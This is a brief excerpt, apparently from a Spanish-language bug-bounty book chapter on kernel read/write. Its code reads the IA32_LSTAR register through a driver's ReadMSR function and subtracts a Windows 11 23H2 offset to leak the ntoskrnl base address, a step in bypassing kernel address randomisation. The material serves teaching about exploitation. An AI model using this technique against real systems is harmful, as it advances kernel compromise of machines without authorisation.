# Extraído de: LibroBugBounty/cap-11-kernel-rw.md
# IA32_LSTAR contiene la dirección de KiSystemCall64
# que es una función de ntoskrnl.exe
lstar = asio.ASIO_ReadMSR(0xC0000082)
# Ejemplo: lstar = 0xFFFFF80254A14C00

# KiSystemCall64 está a un offset conocido de ntoskrnl base
# El offset varía por build de Windows, pero es estable dentro de un build
# Windows 11 23H2: offset = 0x414C00 (verificar con símbolo público)
ntoskrnl_base = lstar - 0x414C00
# ntoskrnl_base = 0xFFFFF80254600000
